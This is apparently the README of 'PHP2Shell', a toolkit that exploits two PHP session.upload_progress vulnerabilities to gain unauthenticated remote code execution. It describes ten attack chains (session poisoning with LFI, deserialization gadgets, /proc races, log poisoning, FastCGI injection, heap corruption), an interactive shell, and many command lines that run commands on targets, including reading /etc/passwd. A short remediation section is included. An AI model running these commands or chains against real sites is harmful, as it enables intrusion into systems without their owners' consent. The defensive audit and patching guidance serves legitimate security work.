# PHP2Shell

> **Advanced Security Assessment & Multi-Chain Exploitation Toolkit** for **CVE-2026-109618** and **CVE-2026-109619** — Critical PHP `session.upload_progress` memory corruption & use-after-free vulnerabilities.

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![CVE](https://img.shields.io/badge/CVE--2026--109618-Critical-red?style=for-the-badge)](https://nvd.nist.gov/)
[![CVE](https://img.shields.io/badge/CVE--2026--109619-Critical-red?style=for-the-badge)](https://nvd.nist.gov/)
[![CVSS](https://img.shields.io/badge/CVSS-9.2%20Critical-red?style=for-the-badge)](https://nvd.nist.gov/)
[![License](https://img.shields.io/badge/License-Security%20Research-blueviolet?style=for-the-badge)](#disclaimer)

---

## ⚠️ Disclaimer

> **This tool is built strictly for authorized security auditing, penetration testing, and defensive research.**
> 
> Testing targets without prior mutual written consent is illegal. The author assumes **zero liability** for misuse or damages resulting from the use of this software.

---

## 🔬 Vulnerability Overview

PHP2Shell targets two critical vulnerabilities in PHP core's `session.upload_progress` handler, affecting all PHP installations from **PHP 5.4 up to unpatched PHP 8.x** where `session.upload_progress.enabled = On` (the default setting in stock PHP installations).

| Vulnerability | Mechanism | Severity | Vector |
|---------------|-----------|----------|--------|
| **CVE-2026-109618** | Heap Use-After-Free via OOM abort during multipart upload processing | **9.2 (Critical)** | Unauthenticated RCE |
| **CVE-2026-109619** | Stale serialization global state reuse across request lifecycles | **9.2 (Critical)** | Unauthenticated RCE |

### Attack Primitives
- **P1 (Session Identifier Injection):** Supply cookie-less arbitrary session IDs through multipart form-data `PHPSESSID`.
- **P2 (Upload Progress Poisoning):** Inject PHP code into serialized session files via `PHP_SESSION_UPLOAD_PROGRESS` and uploaded filename fields, written to disk before request execution.

---

## 🛠️ Toolkit Components

The repository contains two specialized tools:

1. **`php2shell.py`** — Non-destructive detection, CMS fingerprinting, environment auditing, and primitive verification.
2. **`exploit.py`** — Weaponized multi-chain exploitation framework featuring **10 independent RCE chains**, automated scanner, race condition engine, and interactive shell.

---

## 🚀 Features

### 1. `php2shell.py` — Detection & Fingerprinting
- **CMS Identification (11 Platforms):** WordPress, Joomla, Drupal, Magento, Laravel, CodeIgniter, Symfony, phpBB, PrestaShop, OpenCart, Typo3, and generic PHP.
- **Deep Version Extraction:** Extracts version strings from manifests, static assets, and headers.
- **PHP Lifecycle Analysis:** Detects PHP version, SAPI (Apache, PHP-FPM, CLI, CGI), and support lifecycle (Active, Security-Only, or EOL).
- **Inert Primitive Validation:** Verifies P1 and P2 primitives using harmless PHP comment canaries (`<?php /* canary */ ?>`) without executing arbitrary code.
- **Defensive Configuration Audit:** Checks `session.upload_progress.cleanup`, `memory_limit`, `post_max_size`, and SAPI behavior.
- **LFI Sink Enumeration:** Probes for accessible include/require candidate vectors.

### 2. `exploit.py` — 10-Chain Multi-Vector Exploit Engine

| Chain | Technique | Preconditions |
|:-----:|-----------|---------------|
| **1** | Session Poisoning + LFI | `upload_progress` enabled + any accessible LFI |
| **2** | Deserialization Gadgets | `upload_progress` enabled + framework gadget class (Laravel, Symfony, Monolog, Guzzle) |
| **3** | `/proc/self/fd` Race | LFI + readable `/proc` file descriptors |
| **4** | `phpinfo()` Temp File Race | Accessible `phpinfo()` endpoint + LFI |
| **5** | Log Poisoning | LFI + readable server access/error log |
| **6** | PEARCMD Injection | LFI + `pearcmd.php` on system + `register_argc_argv = On` |
| **7** | `/proc/self/environ` | LFI + readable process environment |
| **8** | PHP Stream Wrappers | LFI + `allow_url_include = On` (`php://input`, `data://`) |
| **9** | FastCGI Direct | Direct or forwarded access to PHP-FPM port (auto-prepend injection) |
| **10**| Heap UAF Memory Forge | Precise/blind raw socket heap groom for direct memory corruption |

**Exploitation Engine Features:**
- **Auto Mode:** Automatically discovers endpoints, tests chains in order of reliability, and triggers command execution.
- **Interactive Shell:** Full pseudo-terminal shell with command history and working directory tracking.
- **Race Condition Worker:** Multithreaded burst engine to beat `session.upload_progress.cleanup = On`.
- **Pre-Built Deserialization Gadgets:**
  - *Laravel:* `Illuminate\Broadcasting\PendingBroadcast`
  - *Symfony:* `Symfony\Component\Process\Process`
  - *Monolog:* `Monolog\Handler\BufferHandler`
  - *Guzzle:* `GuzzleHttp\Psr7\FnStream`
- **Reconnaissance & Scan Mode:** Identifies form endpoints, file upload inputs, and LFI query parameters.
- **Network Proxy Support:** Route all requests through HTTP/HTTPS proxies (e.g. Burp Suite, OWASP ZAP).

---

## 📦 Installation & Requirements

- Python 3.8 or higher
- `requests` library

```bash
# Clone repository
git clone https://github.com/eh-amish/php2shell.git
cd php2shell

# Install dependencies
pip install requests
```

---

## 💻 Usage Guide

### Assessment & Fingerprinting (`php2shell.py`)

```bash
# Standard passive assessment
python3 php2shell.py -u https://target.com

# Complete assessment including CMS LFI sink scan (non-interactive)
python3 php2shell.py -u https://target.com --sink-scan --no-confirm

# Active probe mode (tests race & filter evasion)
python3 php2shell.py -u https://target.com --mode active --no-confirm

# Route scanner via proxy
python3 php2shell.py -u https://target.com --proxy http://127.0.0.1:8080
```

### Exploitation Framework (`exploit.py`)

#### 1. Automated Attack & Discovery
```bash
# Auto mode: Scan target, find injection endpoints, try all chains, run command
python3 exploit.py -t http://target.com -c "id"

# Auto mode with custom commands list
python3 exploit.py -t http://target.com --cmds "uname -a" "id" "whoami"
```

#### 2. Specific Attack Chains
```bash
# Execute via Chain 1 (Session Poisoning + LFI)
python3 exploit.py -t http://target.com --chain 1 -c "id"

# Execute via Chain 2 (PHP Object Deserialization)
python3 exploit.py -t http://target.com --chain 2 -c "id"

# Execute via Chain 4 (phpinfo temp file leak)
python3 exploit.py -t http://target.com --chain 4 --phpinfo /phpinfo.php -c "id"

# Execute via Chain 6 (pearcmd.php exploitation)
python3 exploit.py -t http://target.com --chain 6 -c "id"
```

#### 3. Interactive Shell
```bash
# Launch interactive reverse/pseudo shell
python3 exploit.py -t http://target.com --shell
```

#### 4. High-Performance Race Mode
```bash
# Beat session cleanup using 20 concurrent threads and 100 attempts
python3 exploit.py -t http://target.com --race --threads 20 --attempts 100 -c "id"
```

#### 5. Reconnaissance & Surface Scanning
```bash
# Comprehensive surface check (PHP version, framework, exposed files)
python3 exploit.py -t http://target.com --check

# Deep scan for upload forms and vulnerable LFI parameters
python3 exploit.py -t http://target.com --scan
```

#### 6. Manual Endpoint Specification
```bash
# Direct injection and execution targeting specific scripts and parameters
python3 exploit.py -t http://target.com \
  --inject-endpoint /upload.php \
  --lfi-endpoint /index.php \
  --lfi-param page \
  -c "cat /etc/passwd"
```

#### 7. Proxy & Evasion
```bash
# Route through proxy (Burp Suite)
python3 exploit.py -t http://target.com -c "id" --proxy http://127.0.0.1:8080
```

---

## 🛡️ Remediation & Defenses

1. **Update PHP Core:** Upgrade to supported patched releases (PHP 8.2.35+, 8.3.36+, 8.4.27+, 8.5.12+).
2. **Disable Upload Progress:** If upload progress tracking is not strictly needed by your web applications, disable it in `php.ini`:
   ```ini
   session.upload_progress.enabled = Off
   ```
3. **WAF & Ingress Filtering:** Block incoming multipart POST requests where form parameters contain `PHPSESSID` or `PHP_SESSION_UPLOAD_PROGRESS` with PHP code tags (`<?php`, `<?=`).
4. **Harden File Inclusion:** Set `allow_url_include = Off` and sanitize all input parameters used in dynamic file inclusion (`include`, `require`).
5. **Retire EOL PHP Versions:** PHP 5.x, 7.x, 8.0, and 8.1 are End-Of-Life and do not receive official security updates.

---

## 📚 References & Research

- [PHP Security Advisories (GHSA-w8hw-w9fx-j79w)](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [PHP Security Advisories (GHSA-6wmf-4rv5-p3rp)](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [Sansec Research: PHP2Shell Analysis](https://sansec.io/research/php2shell)
- [Huntress Threat Research: Leaked Critical PHP Flaws](https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities)
- [watchTowr Intelligence: PHP CVE-2026-109618 FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)

---

## 👤 Author

**eh-amish**
- GitHub: [@eh-amish](https://github.com/eh-amish)
- Repository: [https://github.com/eh-amish/php2shell](https://github.com/eh-amish/php2shell)
